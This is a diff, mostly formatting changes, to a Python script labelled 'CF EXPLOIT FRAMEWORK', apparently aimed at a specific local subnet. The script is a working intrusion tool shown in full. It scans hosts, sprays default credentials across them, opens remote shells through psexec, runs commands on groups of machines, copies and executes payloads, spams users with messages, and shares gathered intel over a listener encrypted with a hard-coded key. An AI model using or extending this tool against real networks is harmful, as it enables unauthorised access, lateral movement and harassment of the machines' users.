@@ -1,5 +1,3 @@
-# Everything you want in one place
-
 import os
 import time
 import threading
@@ -7,7 +5,6 @@ from threading import *
 import socket
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES
-
 
 banner = '''
   /$$$$$$  /$$$$$$$$ /$$$$$$$$
@@ -20,8 +17,11 @@ banner = '''
  \______/ |________/|__/
                           '''
 validCommands = ["scan", "scannames", "hosts", "credtest", "getcmd", "rexec", "rcpy", "msg", "add", "remove", "intel"]
-validDesc = ["Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name" , "List all hosts stored on this device","Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Add an IP to a list", "Remove an IP from a list", "View intel on a given IP"]
-validUsage = ["-", "-", "-","credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip]"]
+validDesc = [
+    "Run a ping scan to identify hosts on the network", "Run a scan to find all the hosts on the network using netbios name", "List all hosts stored on this device", "Test to see if default creds work", "Open a shell on a remote system (user / pass)", "Run a command on a single or a group of PCs (add default to use 'Default' list)", "rexec but copy and execute a file from this system", "Message a single or group of computers", "Add an IP to a list", "Remove an IP from a list",
+    "View intel on a given IP"
+]
+validUsage = ["-", "-", "-", "credtest [username:password] [list name to save under]", "getcmd [ip] [username] [password]", "rexec [list name] [username:password] [command]", "rcpy [list name] [username:password] [payload name]", "msg [list name] [num times] ", "add [ip] [list]", "remove [ip] [list]", "intel [ip]"]
 
 ipNames = []
 customLists = []
@@ -29,11 +29,8 @@ exclude = [165, 130, 139, 171, 178, 153, 151, 176, 179, 144, 160, 174, 175, 166,
 
 completeFlags = []
 
-
-intel = {
-"10.181.231.165": ["What a legend"]
-}
-intelSources = ["127.0.0.1","10.181.231.165", "10.181.231.130"] #DELETE YOUR IP FROM THIS
+intel = {"10.181.231.165": ["What a legend"]}
+intelSources = ["127.0.0.1", "10.181.231.165", "10.181.231.130"]  #DELETE YOUR IP FROM THIS
 
 #CRYPTO INIT, THESE GET CHANGED REGULARL
 key = b'\xb4y\xbd\xa0\xf2,\x1f~\x03\xb3\xef<7\xc4\xca\xde'
@@ -63,6 +60,7 @@ def readData(filename, intswitch=False):
         totalRet.append([header, ret])
     return totalRet
 
+
 def writeData(filename, data):
     os.remove(filename)
     f = open(filename, "a")
@@ -75,6 +73,7 @@ def writeData(filename, data):
         f.write(writeString)
     f.close()
 
+
 def checkFile(filename):
     try:
         f = open(filename, "r")
@@ -82,10 +81,11 @@ def checkFile(filename):
         f.close()
         return 1
     except:
-        f = open(filename,"w")
+        f = open(filename, "w")
         f.write("")
         f.close()
         return 0
+
 
 def intelInit():
     global customLists
@@ -106,6 +106,7 @@ def intelInit():
     intelInfo = readData("intel.txt")
     for item in intelInfo:
         intel[item[0]] = item[1]
+
 
 def intelWrite():
     global customLists
@@ -132,20 +133,23 @@ def AES_pad(data):
     databytes.extend(b'\x00' * padding_required)
     return bytes(databytes)
 
+
 def AES_unpad(data):
     if not data:
         return data
 
     data = data.rstrip(b'\x00')
-    if data[-1] == 128: # b'\x80'[0]:
+    if data[-1] == 128:  # b'\x80'[0]:
         return data[:-1]
     else:
         return data
+
 
 def encryptAES(data):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     data = AES_pad(data.encode())
     return cipher.encrypt(data)
+
 
 def decryptAES(data):
     cipher = AES.new(key, AES.MODE_CBC, iv)
@@ -158,14 +162,13 @@ def testCrypto():
     code = encryptAES(msg)
     decode1 = decryptAES(code)
 
+
 testCrypto()
-
-
 
 
 def serverT():
     serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = "0.0.0.0" #FUCK YOU TCP YOU BASTARD
+    host = "0.0.0.0"
     port = 13370
     serverSock.bind((host, port))
     serverSock.listen(5)
@@ -176,8 +179,10 @@ def serverT():
         except:
             pass
 
+
 class client(Thread):
     global players
+
     def __init__(self, socket, address):
         Thread.__init__(self)
         self.localPC = None
@@ -221,6 +226,7 @@ class client(Thread):
 #=============================================================================
 #=============================================================================
 
+
 def makeRequest(ip, port, type, subject, body):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.connect((ip, port))
@@ -229,6 +235,7 @@ def makeRequest(ip, port, type, subject, body):
     response = decryptAES(sock.recv(1024))
     sock.close()
     return response
+
 
 def updateIntel(host, info, action="add"):
     global intel
@@ -248,6 +255,7 @@ def updateIntel(host, info, action="add"):
 
         for comp in intelSources:
             makeRequest(comp, 13370, "remove", host, info)
+
 
 def menu():
     for line in banner:
@@ -283,7 +291,7 @@ def menu():
             os.system("cls")
             for line in banner:
                 print(line, end="")
-            print("\nCYBERFIRST EXPLOIT FRAMEWORK v0.2")
+            print("\nCF EXPLOIT FRAMEWORK v0.2")
 
         if cmd[0] == "rexec":
             if len(cmd) == 4:
@@ -298,7 +306,6 @@ def menu():
                 creds = cmd[2]
                 payload = cmd[3]
                 rcpy(targList, payload, creds)
-
 
         if cmd[0] == "scan":
             rscan()
@@ -339,7 +346,6 @@ def menu():
                     ipNames.append(cmd[2])
                 intelWrite()
 
-
         if cmd[0] == "intel":
             try:
                 host = cmd[1]
@@ -365,12 +371,9 @@ def getintel(host):
                 print("|----[+] %s" % item)
 
 
-
-
-
 def rconnect(target, uname, pword):
     print("\n[+] Spawning shell\n")
-    os.system(r"C:\Users\Admin\psexec\psexec -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword)) #CHANGE TO WHEREVER PSEXEC IS
+    os.system(r"C:\Users\Admin\psexec\psexec -nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))  #CHANGE TO WHEREVER PSEXEC IS
 
 
 def credTest(creds="Profile:password", iplist="default"):
@@ -389,7 +392,7 @@ def credTest(creds="Profile:password", iplist="default"):
     index = 0
     for i in customLists[0]:
         completeFlags.append(0)
-        x = threading.Thread(target=rexecT, args=(i,username, password, "hostname", index, True, listIndex))
+        x = threading.Thread(target=rexecT, args=(i, username, password, "hostname", index, True, listIndex))
         x.start()
         index += 1
     while 0 in completeFlags:
@@ -399,6 +402,7 @@ def credTest(creds="Profile:password", iplist="default"):
     print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
     print("[+] " + str(customLists[listIndex]).replace(" ", ""))
     intelWrite()
+
 
 def rexec(targets, cmd, creds):
     global completeFlags
@@ -417,7 +421,7 @@ def rexec(targets, cmd, creds):
     print("\n[+] Done")
 
 
-def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): # The actual function for executing a command so that it can be threaded
+def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0):  # The actual function for executing a command so that it can be threaded
     global completeFlags
     global customLists
 
@@ -434,6 +438,7 @@ def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0): 
             updateIntel(tgt, infostring, action="remove")
 
     completeFlags[index] = 1
+
 
 def rcpy(targetList, payload, creds):
     global completeFlags
@@ -453,7 +458,7 @@ def rcpy(targetList, payload, creds):
     print("\n[+] Done")
 
 
-def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False): # The actual function for executing a command so that it can be threaded
+def rcpyT(tgt=0, uname="", pword="", fname="", index=0, onDesktop=False):  # The actual function for executing a command so that it can be threaded
     global completeFlags
     ending = tgt
     tgt = "10.181.231." + str(tgt)
@@ -501,13 +506,14 @@ def rmsg(targets, reason, num):
     for t in range(0, num):
         for i in targets:
             target = "10.181.231." + str(i)
-            x = threading.Thread(target=rmsgT, args=(reason,target))
+            x = threading.Thread(target=rmsgT, args=(reason, target))
             x.start()
 
 
 def rmsgT(reason="", target=""):
     print("[+] MESSAGING:", target)
     os.system(r'msg Admin /SERVER %s %s' % (target, reason))
+
 
 x = threading.Thread(target=serverT)
 x.start()
